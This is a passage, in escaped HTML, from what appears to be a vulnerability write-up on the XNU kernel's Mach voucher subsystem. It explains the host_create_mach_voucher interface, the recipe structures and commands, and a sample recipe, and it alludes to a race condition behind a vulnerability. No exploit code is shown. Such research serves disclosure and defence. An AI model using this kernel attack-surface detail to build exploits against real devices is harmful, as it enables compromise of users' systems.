class=\"BGLtzooHlW-c11\"&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;this structure shouldn&amp;#39;t need to be reference counted. There is however one very fiddly race condition (which &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;isn&amp;#39;t&lt;/span&gt;&lt;span&gt;&amp;nbsp;the race condition which causes the vulnerability!) which necessitates the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;field. This race condition is sort-of documented and we&amp;#39;ll get there eventually...&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.o5bp0ln346i3\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;Recipes&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;host port &lt;/span&gt;&lt;span&gt;MIG&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c21\"&gt;&lt;a class=\"BGLtzooHlW-c251\" href=\"https://www.nextop.de/NeXTstep_3.3_Developer_Documentation/OperatingSystem/Part1_Mach/02_Messages/Messages.htmld/index.html\"&gt;Mach Interface Generator&lt;/a&gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;) method is the userspace interface for creating vouchers:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3b86534681bae3851c58fa2f335e430bc6b5a4cb\"&gt;&lt;/a&gt;&lt;a id=\"t.11\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;kern_return_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_port_name_t host&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_raw_recipe_array_t recipes&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_size_t recipesCnt&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; mach_port_name_t &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;recipes&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to a buffer filled with a sequence of packed variable-size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;mach_voucher_attr_recipe_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;structures:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.fb086444030469a009e799e34240bece6d1dd33b\"&gt;&lt;/a&gt;&lt;a id=\"t.12\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;typedef&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;mach_voucher_attr_recipe_data &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_recipe_command_t command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_name_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;previous_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one of the four supported voucher attr types we&amp;#39;ve seen before (importance, bank, pthread_priority and user_data) or a wildcard value (&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_KEY_ALL&lt;/span&gt;&lt;span&gt;) indicating that the command should apply to all keys. There are a number of generic commands as well as type-specific commands. Commands can optionally refer to existing vouchers via the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;previous_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;field, which should name a voucher port.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Here are the supported generic commands for voucher creation:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_COPY&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;: copy the attr value from the previous voucher. You can specify the wildcard key to copy all the attr values from the previous voucher.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REMOVE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;: remove the specified attr value from the voucher under construction. This can also remove all the attributes from the voucher under construction (which, arguably, makes no sense.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_SET_VALUE_HANDLE:&lt;/span&gt;&lt;span&gt;&amp;nbsp;this command is only valid for kernel clients; it allows the caller to specify an arbitrary &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;, which doesn&amp;#39;t make sense for userspace and shouldn&amp;#39;t be reachable.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;: the semantics of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c14\"&gt;redeeming&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;an attribute from a previous voucher are not defined by the voucher code; it&amp;#39;s up to the individual managers to determine what that might mean.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Here are the attr-specific commands for voucher creation for each type:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;bank&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11 BGLtzooHlW-c19\"&gt;MACH_VOUCHER_ATTR_BANK_CREATE&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_BANK_MODIFY_PERSONA&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_AUTO_REDEEM&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_SEND_PREPROCESS&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;importance&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_IMPORTANCE_SELF&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;user_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;pthread_priority&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_PTHPRIORITY_CREATE&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Note that there are further commands which can be &amp;quot;executed against&amp;quot; vouchers via the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;mach_voucher_attr_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;MIG method which calls the attr manager&amp;#39;s&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam_command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;function pointer. Those are:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;bank&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;BANK_ORIGINATOR_PID&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;BANK_PERSONA_TOKEN&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;BANK_PERSONA_ID&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;importance&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c19 BGLtzooHlW-c11\"&gt;MACH_VOUCHER_IMPORTANCE_ATTR_DROP_EXTERNAL&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;user_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;none&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;pthread_priority&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;none&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s look at example recipe for creating a voucher with a single &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;attr, consisting of the 4 bytes {0x41, 0x41, 0x41, 0x41}:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6\"&gt;&lt;/a&gt;&lt;a id=\"t.13\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;udata_dword_recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_recipe_data_t recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; uint32_t payload&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;udata_dword_recipe r &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;content_size &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;sizeof&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;uint32_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;.&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;payload &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0x41414141&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Let&amp;#39;s follow the path of this recipe in detail.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Here&amp;#39;s the most important part of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;showing the three high-level phases: voucher allocation, attribute creation and voucher de-duping. It&amp;#39;s not the responsibility of this code to find or allocate a mach port for the voucher; that&amp;#39;s done by the MIG layer code.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.caafa58444ef86dee8c472d187debed00ee56da7\"&gt;&lt;/a&gt;&lt;a id=\"t.14\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* allocate new voucher */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_alloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivgt_keys_in_use&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IV_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span 